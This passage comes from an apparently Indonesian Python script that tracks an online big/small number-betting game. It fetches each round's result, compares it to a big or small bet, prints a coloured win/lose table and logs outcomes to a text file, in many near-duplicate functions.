            g.write("KECIL LOSE\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            losess()
			 
def taruhanbesarX8 ():
    data = {
    'typeid' : '1',
    'pageno' : '1',
    'language' : 'id'
    }
    gameissue()
    countdownTimerX8B()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    a = response_GetNoaverageEmerdList()
    b = json.loads(a.text)
    c = b.get('data')
    d = c.get('list')
    e = d[0].get('issueNumber')
    ff = d[0].get('number')
    with open("Num.txt", 'w') as g:
        g.write(ff)
        g.close()
    ee = open("Num.txt", 'r')
    f = ee.read()
    if f > '5' and f < '9':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB5/9 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            prediksi1()
    elif f > '8':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB5/9 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW2}  JP{L}{PT1}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            losess()
    elif f > '4' and f < '6':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB5/9 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW}  JP{L}{CY}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            prediksi1()
    elif f < '5':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB5/9 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {H}  LOSE  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR LOSE\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            prediksi1()
			 
			 
def auto_besarX9 ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    print(f'{G}•{taruhanbesarX9()}')


def auto_kecilX9 ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['0','1','2','3','4']
    m = ['0','1','2','3','4']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['46%','51%','50%','54%','61%','63%','65%','78%','75%','89%','97%']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    print(f'{G}{taruhankecilX9()}')
			
def taruhankecilX9 ():
    data = {
    'typeid' : '1',
    'pageno' : '1',
    'language' : 'id'
    }
    gameissue()
    countdownTimerX9K()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    session = requests.Session()
    a = response_GetNoaverageEmerdList()
    b = json.loads(a.text)
    c = b.get('data')
    d = c.get('list')
    e = d[0].get('issueNumber')
    ff = d[0].get('number')
    with open("Num.txt", 'w') as g:
        g.write(ff)
        g.close()
    ee = open("Num.txt", 'r')
    f = ee.read()
    if f > '1' and f < '5':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK0/1 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            prediksi1()
    elif f < '2':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK0/1 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW2}  JP{L}{PT1}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            losess()
    elif f > '4':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK0/1 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {H}  LOSE  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL LOSE\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            prediksi1()
			 
def taruhanbesarX9 ():
    data = {
    'typeid' : '1',
    'pageno' : '1',
    'language' : 'id'
    }
    gameissue()
    countdownTimerX9B()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    session = requests.Session()
    a = response_GetNoaverageEmerdList()
    b = json.loads(a.text)
    c = b.get('data')
    d = c.get('list')
    e = d[0].get('issueNumber')
    ff = d[0].get('number')
    with open("Num.txt", 'w') as g:
        g.write(ff)
        g.close()
    ee = open("Num.txt", 'r')
    f = ee.read()
    if f > '8':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB7/8 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            prediksi1()
    elif f > '4' and f < '7':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB7/8 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            prediksi1()
    elif f > '6' and f < '9':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB7/8 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW2}  JP{L}{PT1}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            losess()
    elif f < '5':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB7/8 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {H}  LOSE  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR LOSE\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            prediksi1()
			 
			 
def auto_besarX10 ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    print(f'{G}•{taruhanbesarX10()}')


def auto_kecilX10 ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['0','1','2','3','4']
    m = ['0','1','2','3','4']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['46%','51%','50%','54%','61%','63%','65%','78%','75%','89%','97%']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    print(f'{G}{taruhankecilX10()}')
			
def taruhankecilX10 ():
    data = {
    'typeid' : '1',
    'pageno' : '1',
    'language' : 'id'
    }
    gameissue()
    countdownTimerX10K()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    session = requests.Session()
    a = response_GetNoaverageEmerdList()
    b = json.loads(a.text)
    c = b.get('data')
    d = c.get('list')
    e = d[0].get('issueNumber')
    ff = d[0].get('number')
    with open("Num.txt", 'w') as g:
        g.write(ff)
        g.close()
    ee = open("Num.txt", 'r')
    f = ee.read()
    if f < '1':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK1/2 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX1()
    elif f > '2' and f < '5':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK1/2 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX1()
    elif f > '0' and f < '3':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK1/2 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW2}  JP{L}{PT1}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX1()
    elif f > '4':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK1/2 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {H}  LOSE  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL LOSE\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            losess()
			 
def taruhanbesarX10 ():
    data = {
    'typeid' : '1',
    'pageno' : '1',
    'language' : 'id'
    }
    gameissue()
    countdownTimerX10B()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    a = response_GetNoaverageEmerdList()
    b = json.loads(a.text)
    c = b.get('data')
    d = c.get('list')
    e = d[0].get('issueNumber')
    ff = d[0].get('number')
    with open("Num.txt", 'w') as g:
        g.write(ff)
        g.close()
    ee = open("Num.txt", 'r')
    f = ee.read()
    if f > '4' and f < '6':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB6/8 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX1()
    elif f > '8':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB6/8 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX1()
    elif f > '6' and f < '8':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB6/8 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX1()
    elif f > '5' and f < '7':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB6/8 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW2}  JP{L}{PT1}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX1()
    elif f > '7' and f < '9':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB6/8 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW2}  JP{L}{PT1}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX1()
    elif f < '5':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB6/8 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {H}  LOSE  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR LOSE\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            losess()
			 
def auto_besarX11 ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    print(f'{G}•{taruhanbesarX11()}')


def auto_kecilX11 ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['0','1','2','3','4']
    m = ['0','1','2','3','4']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['46%','51%','50%','54%','61%','63%','65%','78%','75%','89%','97%']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    print(f'{G}{taruhankecilX11()}')
			
def taruhankecilX11 ():
    data = {
    'typeid' : '1',
    'pageno' : '1',
    'language' : 'id'
    }
    gameissue()
    countdownTimerX11K()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    session = requests.Session()
    a = response_GetNoaverageEmerdList()
    b = json.loads(a.text)
    c = b.get('data')
    d = c.get('list')
    e = d[0].get('issueNumber')
    ff = d[0].get('number')
    with open("Num.txt", 'w') as g:
        g.write(ff)
        g.close()
    ee = open("Num.txt", 'r')
    f = ee.read()
    if f > '3' and f < '5':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK1/3 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX0()
    elif f < '1':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK1/3 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX0()
    elif f > '1' and f < '3':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK1/3 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX0()
    elif f > '0' and f < '2':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK1/3 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW2}  JP{L}{PT1}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX0()
    elif f > '2' and f < '4':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK1/3 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW2}  JP{L}{PT1}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX0()
    elif f > '4':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK1/3 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {H}  LOSE  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL LOSE\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX12()
			 
def taruhanbesarX11 ():
    data = {
    'typeid' : '1',
    'pageno' : '1',
    'language' : 'id'
    }
    gameissue()
    countdownTimerX11B()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    session = requests.Session()
    a = response_GetNoaverageEmerdList()
    b = json.loads(a.text)
    c = b.get('data')
    d = c.get('list')
    e = d[0].get('issueNumber')
    ff = d[0].get('number')
    with open("Num.txt", 'w') as g:
        g.write(ff)
        g.close()
    ee = open("Num.txt", 'r')
    f = ee.read()
    if f > '6' and f < '9':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB6/9 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX0()
    elif f > '4' and f < '6':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB6/9 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX0()
    elif f > '8':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB6/9 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW2}  JP{L}{PT1}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX0()
    elif f > '5' and f < '7':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB6/9 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW2}  JP{L}{PT1}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX0()
    elif f < '5':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB6/9 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {H}  LOSE  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR LOSE\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")		
            rumusX12()
			 
			 
def auto_besarX12 ():
			gameissue()
			e = open("issuenumber.txt", 'r')
			jj = e.read()
			g = ['5','6','7','8','9']
			m = ['5','6','7','8','9']
			j = ['🟢','🟢','🔴','🟢','🔴']
			v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
			p = ['  ?? ','  ?? ']
			h = random.SystemRandom()
			i = h.choice(g)
			l = h.choice(m)
			z = h.choice(v)
			u = h.choice(p)
			k = h.choice(j)
			print(f'{G}•{taruhanbesarX12()}')


def auto_kecilX12 ():
			gameissue()
			e = open("issuenumber.txt", 'r')
			jj = e.read()
			g = ['0','1','2','3','4']
			m = ['0','1','2','3','4']
			j = ['🟢','🟢','🔴','🟢','🔴']
			v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
			p = ['46%','51%','50%','54%','61%','63%','65%','78%','75%','89%','97%']
			h = random.SystemRandom()
			i = h.choice(g)
			l = h.choice(m)
			z = h.choice(v)
			u = h.choice(p)
			k = h.choice(j)
			print(f'{G}{taruhankecilX12()}')
			
def taruhankecilX12 ():
    data = {
    'typeid' : '1',
    'pageno' : '1',
    'language' : 'id'
    }
    gameissue()
    countdownTimerX12K()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    session = requests.Session()
    a = response_GetNoaverageEmerdList()
    b = json.loads(a.text)
    c = b.get('data')
    d = c.get('list')
    e = d[0].get('issueNumber')
    ff = d[0].get('number')
    with open("Num.txt", 'w') as g:
        g.write(ff)
        g.close()
    ee = open("Num.txt", 'r')
    f = ee.read()
    if f > '0' and f < '4':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK0/4 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX13()
    elif f > '3' and f < '5':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK0/4 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW2}  JP{L}{PT1}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX13()
    elif f < '1':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK0/4 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW2}  JP{L}{CY}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX13()
    elif f > '4':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK0/4 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {H}  LOSE  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL LOSE\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX13()
			 
def taruhanbesarX12 ():
    data = {
    'typeid' : '1',
    'pageno' : '1',
    'language' : 'id'
    }
    gameissue()
    countdownTimerX12B()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    session = requests.Session()
    a = response_GetNoaverageEmerdList()
    b = json.loads(a.text)
    c = b.get('data')
    d = c.get('list')
